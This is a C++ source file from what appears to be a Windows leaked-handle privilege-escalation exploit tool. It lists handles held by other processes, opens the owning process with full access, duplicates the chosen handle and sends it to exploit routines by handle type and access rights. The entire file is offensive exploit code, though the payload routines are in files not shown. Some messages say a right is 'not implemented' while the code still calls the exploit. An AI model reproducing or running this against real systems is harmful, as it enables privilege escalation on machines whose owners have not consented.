#include "ElhExploit.h"
#include "ElhHelper.h"
#include "ExploitProcess.h"
#include "ExploitThread.h"
#include "ExploitFile.h"

ElhExploit::ElhExploit(std::vector<HANDLE_OBJ>& interestingHandles) {
	this->targetHandle = selectHandleToExploit(interestingHandles);
	this->targetProcess = openProcessID(this->targetHandle.handleInfo.UniqueProcessId, PROCESS_ALL_ACCESS);
	this->dupedHandle = duplicateHandle(this->targetHandle.handleInfo, this->targetProcess);
	this->grantedAccess = this->targetHandle.handleInfo.GrantedAccess;
}

ElhExploit::~ElhExploit() {
	CloseHandle(this->targetProcess);
	CloseHandle(this->dupedHandle);
}

bool ElhExploit::selectionValid() {
	return this->targetProcess != INVALID_HANDLE_VALUE && this->dupedHandle != nullptr;
}

bool ElhExploit::exploitHandle() {
	wprintf(L"[+] Attempting to exploit %s(0x%X) handle from %s(%d)..\n",
		this->targetHandle.handleType,
		this->targetHandle.handleInfo.HandleValue,
		this->targetHandle.procName.c_str(),
		this->targetHandle.handleInfo.UniqueProcessId
	);
	bool endResult = false;
	switch (this->targetHandle.handleInfo.ObjectTypeIndex) {
	case PROCESS_HANDLE_TYPE:
		exploitProcessHandle(endResult);
		break;
	case THREAD_HANDLE_TYPE:
		exploitThreadHandle(endResult);
		break;
	case FILE_HANDLE_TYPE:
	case SECTION_HANDLE_TYPE:
	case KEY_HANDLE_TYPE:
		exploitFileHandle(endResult);
		break;
	}
	return endResult;
}

HANDLE_OBJ ElhExploit::selectHandleToExploit(std::vector<HANDLE_OBJ>& interestingHandles) {
	HANDLE_OBJ selectedHandleObj;

	wprintf(L"[+] Identified %llu interesting handles:\n", interestingHandles.size());
	for (const HANDLE_OBJ& ihData : interestingHandles) {
		wprintf(L"\n %.2llu - %s(%d)\n", &ihData - &interestingHandles[0], ihData.procName.c_str(), ihData.handleInfo.UniqueProcessId);
		wprintf(L"\tParent Process : %s(%d)\n", ihData.parentName.c_str(), ihData.parentPID);
		wprintf(L"\tHandle Value   : 0x%X\n", ihData.handleInfo.HandleValue);
		wprintf(L"\tHandle Type    : %s [0x%X]\n", ihData.handleType, ihData.handleInfo.ObjectTypeIndex);
		wprintf(L"\tObject Name    : %s\n", ihData.objectName.c_str());
		wprintf(L"\tAccess Mask    : 0x%X\n", ihData.handleInfo.GrantedAccess);
		for (const auto& handleRight : ihData.handleRights) {
			wprintf(L"\t\t- %s\n", handleRight);
		}
	}

	wprintf(L"\n Select a handle [0..%llu] => ", interestingHandles.size() - 1);
	int selectedHandle = -1;
	std::cin >> selectedHandle;
	wprintf(L"\n");
	if (!std::cin.fail() && selectedHandle >= 0 && selectedHandle < interestingHandles.size()) {
		selectedHandleObj = interestingHandles[selectedHandle];
	}
	return selectedHandleObj;
}

void ElhExploit::exploitProcessHandle(bool &endResult) {
	if (accessContainsRights(this->grantedAccess, PROCESS_ALL_ACCESS)) {
		wprintf(L"\t- Exploiting 'PROCESS_ALL_ACCESS' handle right\n\n");
		endResult = ExploitProcess::exploitAllAccess(this->dupedHandle);

	} else if (accessContainsRights(this->grantedAccess, PROCESS_CREATE_PROCESS)) {
		wprintf(L"\t- Exploiting 'PROCESS_CREATE_PROCESS' handle right\n\n");
		endResult = ExploitProcess::exploitCreateProcess(this->dupedHandle);

	} else if (accessContainsRights(this->grantedAccess, PROCESS_CREATE_THREAD)) {
		wprintf(L"\t- 'PROCESS_CREATE_THREAD' handle right not implemented\n\n");

	} else if (accessContainsRights(this->grantedAccess, PROCESS_DUP_HANDLE)) {
		wprintf(L"\t- Exploiting 'PROCESS_DUP_HANDLE' handle right\n\n");
		endResult = ExploitProcess::exploitDupHandle(this->dupedHandle);

	} else if (accessContainsRights(this->grantedAccess, PROCESS_VM_WRITE)) {
		wprintf(L"\t- 'PROCESS_VM_WRITE' handle right not implemented\n\n");
	}
}


void ElhExploit::exploitThreadHandle(bool &endResult) {
	if (accessContainsRights(this->grantedAccess, THREAD_ALL_ACCESS)) {
		wprintf(L"\t- 'THREAD_ALL_ACCESS' handle right not implemented\n\n");
		endResult = ExploitThread::exploitAllAccess(this->dupedHandle);

	} else if (accessContainsRights(this->grantedAccess, THREAD_DIRECT_IMPERSONATION)) {
		wprintf(L"\t- 'THREAD_DIRECT_IMPERSONATION' handle right not implemented\n\n");
		endResult = ExploitThread::exploitDirectImpersonation(this->dupedHandle);

	} else if (accessContainsRights(this->grantedAccess, THREAD_SET_CONTEXT)) {
		wprintf(L"\t- 'THREAD_SET_CONTEXT' handle right not implemented\n\n");
		endResult = ExploitThread::exploitSetContext(this->dupedHandle);
	}
}

void ElhExploit::exploitFileHandle(bool& endResult) {
	if (accessContainsRights(this->grantedAccess, FILE_WRITE_DATA)) {
		wprintf(L"\t- 'FILE_WRITE_DATA' handle right not implemented\n\n");
		ExploitFile::exploitWriteAccess(this->dupedHandle);
	}
}